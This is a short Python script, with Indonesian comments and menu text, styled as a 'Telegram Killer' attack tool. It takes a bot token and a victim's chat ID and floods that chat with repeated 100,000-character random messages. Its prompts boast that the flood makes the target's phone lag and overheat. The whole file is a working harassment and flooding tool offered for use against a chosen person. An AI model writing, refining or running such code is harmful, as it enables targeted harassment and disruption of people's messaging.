import telegram
import time
import random
import string
from colorama import init, Fore, Style
import os

# Inisialisasi colorama buat tampilan warna
init()

def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner = f"""
{Fore.RED}========================================================
     💉💉💉 TELEGRAM KILLER 💉💉💉
     🩸 BY BLACKHAT EROR SYSTEM 🩸
     😈 BIKIN TELEGRAM TARGET AMBRUK 😈
     💣 Powered by Mr.4Rex_503 💣
========================================================{Style.RESET_ALL}
"""
    print(banner)

def generate_crash_message(length=100000):
    # Bikin pesan raksasa buat nge-lag
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def send_crash_messages(token, chat_id, message_count=100):
    bot = telegram.Bot(token=token)
    crash_message = generate_crash_message()
    print(f"{Fore.RED}🩸 Mulai serangan: {message_count} bom pesan siap dikirim! 💣{Style.RESET_ALL}")
    for i in range(message_count):
        try:
            bot.send_message(chat_id=chat_id, text=crash_message)
            print(f"{Fore.GREEN}💉 Bom pesan ke-{i+1} terkirim! HP target mulai kepanasan! 😈{Style.RESET_ALL}")
            time.sleep(0.5)  # Delay biar ga kena rate limit
        except Exception as e:
            print(f"{Fore.YELLOW}⚠ Ups, error di pesan ke-{i+1}: {e}. Tetep lanjut, bro! 😄{Style.RESET_ALL}")
    print(f"{Fore.RED}🩸 SERANGAN SELESAI! Telegram target udah KO, HP-nya ngebul! 💥{Style.RESET_ALL}")

def main_menu():
    while True:
        print_banner()
        print(f"{Fore.RED}🔪 MENU PERUSAK: 🔪{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}1. Mulai Serangan Telegram 💣{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}2. Keluar (Loh, takut? 😏){Style.RESET_ALL}")
        choice = input(f"{Fore.RED}🩸 Pilih opsi (1-2): {Style.RESET_ALL}")

        if choice == '1':
            token = input(f"{Fore.RED}🩸 Masukin token bot Telegram lu: {Style.RESET_ALL}")
            chat_id = input(f"{Fore.RED}🩸 Masukin chat ID target: {Style.RESET_ALL}")
            try:
                message_count = int(input(f"{Fore.RED}🩸 Berapa pesan virus yang mau dikirim? (default 100): {Style.RESET_ALL}") or 100)
            except ValueError:
                message_count = 100
            print(f"{Fore.RED}💉 Siap-siap, bro! Serangan ke {chat_id} dimulai! 😈{Style.RESET_ALL}")
            send_crash_messages(token, chat_id, message_count)
            input(f"{Fore.YELLOW}🩸 Tekan Enter buat balik ke menu...{Style.RESET_ALL}")
        elif choice == '2':
            print(f"{Fore.RED}😈 Kabur? Baiklah, sampai jumpa di kekacauan berikutnya! 💣{Style.RESET_ALL}")
            break
        else:
            print(f"{Fore.YELLOW}⚠ Pilihan salah, bro! Coba lagi, jangan bikin malu! 😏{Style.RESET_ALL}")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
